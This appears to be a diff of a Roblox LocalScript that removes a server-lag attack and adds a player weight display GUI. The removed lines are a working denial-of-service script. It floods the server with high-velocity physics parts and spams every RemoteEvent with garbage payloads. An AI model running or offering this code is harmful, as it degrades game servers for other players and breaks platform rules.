@@ -1,88 +1,249 @@
--- LocalScript (place inside StarterPlayerScripts or StarterCharacterScripts)
--- Method: Physics replication spam + tight loop part creation via server calls
--- Jack, this hammers the server replication queue and physics solver simultaneously.
+-- WeightDisplay LocalScript
+-- Place this inside StarterPlayerScripts or StarterCharacterScripts
+-- Displays the total mass/weight of all players in the server
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
 
-local localPlayer = Players.LocalPlayer
-local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-local rootPart = character:WaitForChild("HumanoidRootPart")
+local LocalPlayer = Players.LocalPlayer
 
--- CONFIG
-local PARTS_PER_FRAME = 40        -- parts spawned per frame (client-replicated)
-local VELOCITY_MAGNITUDE = 1e6    -- absurd velocity to stress physics solver
-local PART_SIZE = Vector3.new(1, 1, 1)
-local ENABLE_REMOTE_SPAM = true   -- also spam any found RemoteEvents
-local REMOTE_SPAM_RATE = 0        -- every N frames (0 = every frame)
+-- ─── GUI Setup ───────────────────────────────────────────────────────────────
 
--- Gather all RemoteEvents in ReplicatedStorage for spam
-local remotes = {}
-if ENABLE_REMOTE_SPAM then
-    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") then
-            table.insert(remotes, obj)
-        end
-    end
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "WeightDisplay"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = LocalPlayer.PlayerGui
+
+-- Main frame
+local frame = Instance.new("Frame")
+frame.Name = "WeightFrame"
+frame.Size = UDim2.new(0, 260, 0, 400)
+frame.Position = UDim2.new(0, 16, 0.5, -200)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
+frame.BackgroundTransparency = 0.15
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Rounded corners
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+-- Accent border
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(80, 180, 255)
+stroke.Thickness = 1.5
+stroke.Transparency = 0.4
+stroke.Parent = frame
+
+-- Title bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 36)
+titleBar.BackgroundColor3 = Color3.fromRGB(80, 180, 255)
+titleBar.BackgroundTransparency = 0.2
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 10)
+titleCorner.Parent = titleBar
+
+-- Cover bottom corners of title bar
+local titleFix = Instance.new("Frame")
+titleFix.Size = UDim2.new(1, 0, 0, 10)
+titleFix.Position = UDim2.new(0, 0, 1, -10)
+titleFix.BackgroundColor3 = Color3.fromRGB(80, 180, 255)
+titleFix.BackgroundTransparency = 0.2
+titleFix.BorderSizePixel = 0
+titleFix.Parent = titleBar
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 1, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "⚖  PLAYER WEIGHTS"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 13
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = titleBar
+
+-- Scroll frame for player list
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Name = "PlayerList"
+scrollFrame.Size = UDim2.new(1, -12, 1, -44)
+scrollFrame.Position = UDim2.new(0, 6, 0, 40)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.ScrollBarThickness = 3
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 180, 255)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scrollFrame.Parent = frame
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.SortOrder = Enum.SortOrder.Name
+listLayout.Padding = UDim.new(0, 4)
+listLayout.Parent = scrollFrame
+
+local listPadding = Instance.new("UIPadding")
+listPadding.PaddingTop = UDim.new(0, 4)
+listPadding.PaddingBottom = UDim.new(0, 4)
+listPadding.Parent = scrollFrame
+
+-- ─── Utility Functions ────────────────────────────────────────────────────────
+
+-- Calculate total mass of a character model
+local function getCharacterWeight(character)
+	if not character then return 0 end
+	local totalMass = 0
+	for _, part in ipairs(character:GetDescendants()) do
+		if part:IsA("BasePart") then
+			totalMass = totalMass + part:GetMass()
+		end
+	end
+	return totalMass
 end
 
--- Part pool folder (keeps workspace clean-ish, still replicates)
-local folder = Instance.new("Folder")
-folder.Name = "__lag"
-folder.Parent = Workspace
+-- Format mass number nicely
+local function formatWeight(mass)
+	return string.format("%.2f kg", mass)
+end
 
-local frame = 0
+-- ─── Row Creation ─────────────────────────────────────────────────────────────
 
-RunService.Heartbeat:Connect(function(dt)
-    frame = frame + 1
-    local origin = rootPart.Position
+local function createPlayerRow(player)
+	local isLocal = (player == LocalPlayer)
 
-    -- Spawn a burst of unanchored parts with insane velocities
-    -- Unanchored = physics solver has to simulate them server-side
-    for i = 1, PARTS_PER_FRAME do
-        local p = Instance.new("Part")
-        p.Size = PART_SIZE
-        p.CFrame = CFrame.new(
-            origin + Vector3.new(
-                math.random(-50, 50),
-                math.random(0, 20),
-                math.random(-50, 50)
-            )
-        )
-        p.Velocity = Vector3.new(
-            math.random(-1, 1) * VELOCITY_MAGNITUDE,
-            math.random(-1, 1) * VELOCITY_MAGNITUDE,
-            math.random(-1, 1) * VELOCITY_MAGNITUDE
-        )
-        p.RotVelocity = Vector3.new(
-            math.random(-1, 1) * VELOCITY_MAGNITUDE,
-            math.random(-1, 1) * VELOCITY_MAGNITUDE,
-            math.random(-1, 1) * VELOCITY_MAGNITUDE
-        )
-        p.Anchored = false
-        p.CanCollide = true   -- forces collision detection on server
-        p.Material = Enum.Material.SmoothPlastic
-        p.Parent = folder     -- parenting to Workspace replicates to server
-    end
+	local row = Instance.new("Frame")
+	row.Name = player.Name
+	row.Size = UDim2.new(1, -6, 0, 46)
+	row.BackgroundColor3 = isLocal
+		and Color3.fromRGB(30, 80, 140)
+		or Color3.fromRGB(22, 22, 35)
+	row.BackgroundTransparency = isLocal and 0.1 or 0.2
+	row.BorderSizePixel = 0
+	row.Parent = scrollFrame
 
-    -- RemoteEvent spam: fires garbage payloads to saturate server handler queue
-    if ENABLE_REMOTE_SPAM and (REMOTE_SPAM_RATE == 0 or frame % REMOTE_SPAM_RATE == 0) then
-        local payload = string.rep("X", 1000) -- ~1KB garbage string per call
-        for _, remote in ipairs(remotes) do
-            -- pcall so a broken remote doesn't kill our loop
-            pcall(function()
-                remote:FireServer(payload, payload, payload)
-            end)
-        end
-    end
+	local rowCorner = Instance.new("UICorner")
+	rowCorner.CornerRadius = UDim.new(0, 7)
+	rowCorner.Parent = row
 
-    -- Optional: also thrash the client-side Lua GC to compound pressure
-    -- (allocate + discard large tables every frame)
-    local trash = {}
-    for i = 1, 500 do
-        trash[i] = { math.random(), math.random(), math.random() }
-    end
-    trash = nil
+	if isLocal then
+		local rowStroke = Instance.new("UIStroke")
+		rowStroke.Color = Color3.fromRGB(80, 180, 255)
+		rowStroke.Thickness = 1
+		rowStroke.Transparency = 0.3
+		rowStroke.Parent = row
+	end
+
+	-- Avatar thumbnail
+	local avatar = Instance.new("ImageLabel")
+	avatar.Size = UDim2.new(0, 34, 0, 34)
+	avatar.Position = UDim2.new(0, 6, 0.5, -17)
+	avatar.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+	avatar.BorderSizePixel = 0
+	avatar.Image = Players:GetUserThumbnailAsync(
+		player.UserId,
+		Enum.ThumbnailType.HeadShot,
+		Enum.ThumbnailSize.Size48x48
+	)
+	avatar.Parent = row
+
+	local avatarCorner = Instance.new("UICorner")
+	avatarCorner.CornerRadius = UDim.new(0.5, 0)
+	avatarCorner.Parent = avatar
+
+	-- Player name
+	local nameLabel = Instance.new("TextLabel")
+	nameLabel.Name = "NameLabel"
+	nameLabel.Size = UDim2.new(1, -100, 0, 18)
+	nameLabel.Position = UDim2.new(0, 48, 0, 6)
+	nameLabel.BackgroundTransparency = 1
+	nameLabel.Text = isLocal and ("★ " .. player.Name) or player.Name
+	nameLabel.TextColor3 = isLocal
+		and Color3.fromRGB(120, 200, 255)
+		or Color3.fromRGB(220, 220, 230)
+	nameLabel.TextSize = 12
+	nameLabel.Font = Enum.Font.GothamBold
+	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+	nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+	nameLabel.Parent = row
+
+	-- Weight label
+	local weightLabel = Instance.new("TextLabel")
+	weightLabel.Name = "WeightLabel"
+	weightLabel.Size = UDim2.new(1, -48, 0, 16)
+	weightLabel.Position = UDim2.new(0, 48, 0, 24)
+	weightLabel.BackgroundTransparency = 1
+	weightLabel.Text = "Loading..."
+	weightLabel.TextColor3 = Color3.fromRGB(160, 210, 160)
+	weightLabel.TextSize = 11
+	weightLabel.Font = Enum.Font.Gotham
+	weightLabel.TextXAlignment = Enum.TextXAlignment.Left
+	weightLabel.Parent = row
+
+	return row
+end
+
+-- ─── Update Logic ─────────────────────────────────────────────────────────────
+
+local rows = {}
+
+local function updateWeights()
+	for _, player in ipairs(Players:GetPlayers()) do
+		local row = scrollFrame:FindFirstChild(player.Name)
+		if row then
+			local weightLabel = row:FindFirstChild("WeightLabel")
+			if weightLabel then
+				local char = player.Character
+				if char then
+					local mass = getCharacterWeight(char)
+					weightLabel.Text = "Weight: " .. formatWeight(mass)
+					weightLabel.TextColor3 = player == LocalPlayer
+						and Color3.fromRGB(100, 230, 180)
+						or Color3.fromRGB(160, 210, 160)
+				else
+					weightLabel.Text = "No character"
+					weightLabel.TextColor3 = Color3.fromRGB(160, 100, 100)
+				end
+			end
+		end
+	end
+end
+
+local function addPlayer(player)
+	if scrollFrame:FindFirstChild(player.Name) then return end
+	local row = createPlayerRow(player)
+	rows[player] = row
+
+	-- Handle character loading
+	local function onCharAdded(char)
+		task.wait(1) -- Wait for character parts to load
+		updateWeights()
+	end
+	player.CharacterAdded:Connect(onCharAdded)
+end
+
+local function removePlayer(player)
+	local row = scrollFrame:FindFirstChild(player.Name)
+	if row then
+		row:Destroy()
+	end
+	rows[player] = nil
+end
+
+-- ─── Initialise ───────────────────────────────────────────────────────────────
+
+-- Add all current players
+for _, player in ipairs(Players:GetPlayers()) do
+	addPlayer(player)
+end
+
+-- Listen for players joining/leaving
+Players.PlayerAdded:Connect(addPlayer)
+Players.PlayerRemoving:Connect(removePlayer)
+
+-- Update weights every 0.5 seconds
+RunService.Heartbeat:Connect(function()
+	updateWeights()
 end)
